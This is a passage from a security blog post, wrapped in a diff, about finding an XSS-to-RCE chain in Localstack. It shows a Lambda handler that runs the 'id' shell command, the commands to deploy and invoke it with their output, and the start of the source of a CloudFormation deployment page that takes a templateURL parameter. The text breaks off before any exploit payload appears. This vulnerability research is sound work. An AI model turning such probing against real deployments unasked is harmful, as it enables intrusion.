@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+ 
+
+
+      <title>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE - </title>
+
+  <meta name="description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.
+Once installed the localstack can be started:
+(venv) ┌──(cyberroute)-[~/Development/localstack_code] └─$ localstack start -d __ _______ __ __ / / ____ _________ _/ / ___// /_____ ______/ /__ / / / __ \/ ___/ __ `/ /\__ \/ __/ __ `/ ___/ //_/ / /___/ /_/ / /__/ /_/ / /___/ / /_/ /_/ / /__/ ,&lt; /_____/\____/\___/\__,_/_//____/\__/\__,_/\___/_/|_| - LocalStack CLI: 4.">
+  <meta name="author" content="Alessandro Bresciani"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Blog",
+    
+    "url": "https:\/\/cyberroute.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/cyberroute.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/cyberroute.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/cyberroute.github.io\/post\/2025-12-11-localstack-hack\/",
+          "name": "Attacking localstack with the help of a broken cloud formation external feature got me an xss to rce"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Alessandro Bresciani"
+  },
+  "headline": "Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE",
+  "description" : "What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.\nOnce installed the localstack can be started:\n(venv) ┌──(cyberroute)-[~\/Development\/localstack_code] └─$ localstack start -d __ _______ __ __ \/ \/ ____ _________ _\/ \/ ___\/\/ \/_____ ______\/ \/__ \/ \/ \/ __ \\\/ ___\/ __ \u0060\/ \/\\__ \\\/ __\/ __ \u0060\/ ___\/ \/\/_\/ \/ \/___\/ \/_\/ \/ \/__\/ \/_\/ \/ \/___\/ \/ \/_\/ \/_\/ \/ \/__\/ ,\u0026lt; \/_____\/\\____\/\\___\/\\__,_\/_\/\/____\/\\__\/\\__,_\/\\___\/_\/|_| - LocalStack CLI: 4.",
+  "inLanguage" : "en",
+  "wordCount":  2046 ,
+  "datePublished" : "2025-12-11T10:10:12",
+  "dateModified" : "2025-12-11T10:10:12",
+  "image" : "https:\/\/cyberroute.github.io\/img\/avatar-icon.png",
+  "keywords" : [ "" ],
+  "mainEntityOfPage" : "https:\/\/cyberroute.github.io\/post\/2025-12-11-localstack-hack\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/cyberroute.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/cyberroute.github.io\/img\/avatar-icon.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE" />
+<meta property="og:description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.
+Once installed the localstack can be started:
+(venv) ┌──(cyberroute)-[~/Development/localstack_code] └─$ localstack start -d __ _______ __ __ / / ____ _________ _/ / ___// /_____ ______/ /__ / / / __ \/ ___/ __ `/ /\__ \/ __/ __ `/ ___/ //_/ / /___/ /_/ / /__/ /_/ / /___/ / /_/ /_/ / /__/ ,&lt; /_____/\____/\___/\__,_/_//____/\__/\__,_/\___/_/|_| - LocalStack CLI: 4.">
+<meta property="og:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
+<meta property="og:url" content="https://cyberroute.github.io/post/2025-12-11-localstack-hack/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Blog" />
+
+  <meta name="twitter:title" content="Attacking Localstack with the help of a broken CloudFormation external …" />
+  <meta name="twitter:description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python …">
+  <meta name="twitter:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://cyberroute.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.123.7">
+  <link rel="alternate" href="https://cyberroute.github.io/index.xml" type="application/rss+xml" title="Blog"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="https://cyberroute.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://cyberroute.github.io/css/syntax.css" /><link rel="stylesheet" href="https://cyberroute.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://cyberroute.github.io/">Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="/">Blog</a>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent">Projects</a>
+              <div class="navlinks-children">
+                
+                  <a href="/post/2024-02-25-scanme">Scanme</a>
+                
+                  <a href="/post/2024-03-11-bruter">Bruter</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="/page/about/">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Blog" href="https://cyberroute.github.io/">
+            <img class="avatar-img" src="https://cyberroute.github.io/img/avatar-icon.png" alt="Blog" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+    <div id="header-big-imgs" data-num-img=3
+      
+         
+          data-img-src-1="/img/triangle.jpg"
+         
+         
+      
+         
+          data-img-src-2="/img/sphere.jpg"
+         
+         
+      
+         
+          data-img-src-3="/img/hexagon.jpg"
+         
+         
+      ></div>
+  
+
+  <header class="header-section has-img">
+    
+      
+      <div class="intro-header big-img" style="background-image: url('/img/triangle.jpg');">
+        
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+              <div class="post-heading">
+                <h1>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE</h1>
+                  
+                  
+                    <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 11, 2025
+  
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Alessandro Bresciani
+    
+  
+  
+</span>
+
+
+                  
+              </div>
+            </div>
+          </div>
+        </div>
+        <span class="img-desc" style="display: inline;"></span>
+      </div>
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 11, 2025
+  
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Alessandro Bresciani
+    
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <h1 id="what-is-localstack-and-how-to-quick-start-it">What is Localstack and how to quick start it?</h1>
+<p>Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.</p>
+<p>Once installed the localstack can be started:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/localstack_code<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ localstack start -d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     __                     _______ __             __
+</span></span><span style="display:flex;"><span>    / /   ____  _________ _/ / ___// /_____ ______/ /__
+</span></span><span style="display:flex;"><span>   / /   / __ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#e6db74">`</span>/ /<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\/</span> __/ __ <span style="color:#e6db74">`</span>/ ___/ //_/
+</span></span><span style="display:flex;"><span>  / /___/ /_/ / /__/ /_/ / /___/ / /_/ /_/ / /__/ ,&lt;
+</span></span><span style="display:flex;"><span> /_____/<span style="color:#ae81ff">\_</span>___/<span style="color:#ae81ff">\_</span>__/<span style="color:#ae81ff">\_</span>_,_/_//____/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>__/_/|_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- LocalStack CLI: 4.11.1
+</span></span><span style="display:flex;"><span>- Profile: default
+</span></span><span style="display:flex;"><span>- App: https://app.localstack.cloud
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:34:21<span style="color:#f92672">]</span> starting LocalStack in Docker mode 🐳                                                                                         localstack.py:532
+</span></span><span style="display:flex;"><span>           preparing environment                                                                                                         bootstrap.py:1315
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:34:22<span style="color:#f92672">]</span> configuring container                                                                                                         bootstrap.py:1324
+</span></span><span style="display:flex;"><span>           container image not found on host                                                                                             bootstrap.py:1304
+</span></span><span style="display:flex;"><span>⠴ Pulling container image localstack/localstack
+</span></span></code></pre></div><p>At this stage it is possible to login at <a href="https://app.localstack.cloud">https://app.localstack.cloud</a> and access the platform with an authenticated access via either Github/Google or whatever:</p>
+<p><img src="/images/localstack.png" alt="alt"></p>
+<p>Now, what is the AWS service that executes code, well there is a few right? But the one and only Lambda functions are the very best for doing that, so my tests started right there! I did not even bother to read the code at the start of this research.</p>
+<p>So I put together a simple lambda function that looks something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">execSync</span>} <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">import</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;id&#39;</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>deployed the function as per docs <a href="https://docs.localstack.cloud/aws/services/lambda/">https://docs.localstack.cloud/aws/services/lambda/</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/evilambda<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ awslocal lambda create-function <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --function-name localstack-lambda-id <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --runtime nodejs18.x <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --zip-file fileb://function.zip <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --handler index.handler <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --role arn:aws:iam::000000000000:role/lambda-role
+</span></span></code></pre></div><p>invoked it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/evilambda<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ awslocal lambda invoke --function-name localstack-lambda-id <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --payload <span style="color:#e6db74">&#39;{&#34;body&#34;: &#34;{\&#34;num1\&#34;: \&#34;10\&#34;, \&#34;num2\&#34;: \&#34;10\&#34;}&#34; }&#39;</span> output.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;StatusCode&#34;</span>: 200,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ExecutedVersion&#34;</span>: <span style="color:#e6db74">&#34;</span>$LATEST<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/evilambda<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat output.txt
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uid=993(sbx_user1051) gid=990 groups=990,0(root)\n&#34;</span>%
+</span></span></code></pre></div><p>That is interesting, the same would work also on AWS, but with the difference that the sandbox user is not part of the group root which makes a lot of sense when thinking about container security (not in context with the write-up though)</p>
+<p><img src="/images/lambda.png" alt="alt"></p>
+<p>So far I have been just learning about the product and clicking around to understand how it works. So I go on the <a href="https://docs.localstack.cloud/">https://docs.localstack.cloud/</a> to read more about Localstack, browsing around I find an interesting external feature that looks like the below:</p>
+<p><img src="/images/deploy.png" alt="alt"></p>
+<p>I visit that URL and I end up onto an apparently broken feature that seems to be intended to deploy CloudFormation templates as templateURL query paramenter. Full dump of the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">LocalStack</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">CloudFormation</span> <span style="color:#a6e22e">Deployment</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/react/umd/react.development.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/react-dom/umd/react-dom.development.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/@babel/standalone/babel.min.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.1015.0/aws-sdk.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/purecss@1.0.0/build/pure-min.css&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/link&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">style</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">div</span> { <span style="color:#a6e22e">padding</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">px</span>; }
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">wrapper</span> { <span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">80</span><span style="color:#f92672">%</span>; <span style="color:#a6e22e">margin</span><span style="color:#f92672">-</span><span style="color:#a6e22e">left</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">%</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/style&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/head&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/div&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/babel&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">REGIONS</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;af-south-1&#34;</span>, <span style="color:#e6db74">&#34;ap-east-1&#34;</span>, <span style="color:#e6db74">&#34;ap-east-2&#34;</span>, <span style="color:#e6db74">&#34;ap-northeast-1&#34;</span>, <span style="color:#e6db74">&#34;ap-northeast-2&#34;</span>, <span style="color:#e6db74">&#34;ap-northeast-3&#34;</span>, <span style="color:#e6db74">&#34;ap-south-1&#34;</span>, <span style="color:#e6db74">&#34;ap-south-2&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-1&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-2&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-3&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-4&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-5&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-6&#34;</span>, <span style="color:#e6db74">&#34;ap-southeast-7&#34;</span>, <span style="color:#e6db74">&#34;ca-central-1&#34;</span>, <span style="color:#e6db74">&#34;ca-west-1&#34;</span>, <span style="color:#e6db74">&#34;cn-north-1&#34;</span>, <span style="color:#e6db74">&#34;cn-northwest-1&#34;</span>, <span style="color:#e6db74">&#34;eu-central-1&#34;</span>, <span style="color:#e6db74">&#34;eu-central-2&#34;</span>, <span style="color:#e6db74">&#34;eu-isoe-west-1&#34;</span>, <span style="color:#e6db74">&#34;eu-north-1&#34;</span>, <span style="color:#e6db74">&#34;eu-south-1&#34;</span>, <span style="color:#e6db74">&#34;eu-south-2&#34;</span>, <span style="color:#e6db74">&#34;eu-west-1&#34;</span>, <span style="color:#e6db74">&#34;eu-west-2&#34;</span>, <span style="color:#e6db74">&#34;eu-west-3&#34;</span>, <span style="color:#e6db74">&#34;il-central-1&#34;</span>, <span style="color:#e6db74">&#34;me-central-1&#34;</span>, <span style="color:#e6db74">&#34;me-south-1&#34;</span>, <span style="color:#e6db74">&#34;mx-central-1&#34;</span>, <span style="color:#e6db74">&#34;sa-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-east-2&#34;</span>, <span style="color:#e6db74">&#34;us-gov-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-gov-west-1&#34;</span>, <span style="color:#e6db74">&#34;us-iso-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-iso-west-1&#34;</span>, <span style="color:#e6db74">&#34;us-isob-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-isof-east-1&#34;</span>, <span style="color:#e6db74">&#34;us-isof-south-1&#34;</span>, <span style="color:#e6db74">&#34;us-west-1&#34;</span>, <span style="color:#e6db74">&#34;us-west-2&#34;</span>];
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">DEFAULT_REGION</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;us-east-1&#34;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">LOCALSTACK_ENDPOINT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">protocol</span><span style="color:#e6db74">}</span><span style="color:#e6db74">//</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">update</span>({<span style="color:#a6e22e">endpoint</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">LOCALSTACK_ENDPOINT</span>, <span style="color:#a6e22e">accessKeyId</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#a6e22e">secretAccessKey</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;test&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// parameter placeholders - filled in by the server when final HTML page gets rendered
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">templateBody</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">defaultStackName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stack1&#34;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">initErrorMessage</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">passedRegion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;region&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">DEFAULT_REGION</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">templateURL</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;templateURL&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// TODO: allow passing stack parameter values via queryParams as well!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">StackDetails</span> (<span style="color:#a6e22e">props</span>) {
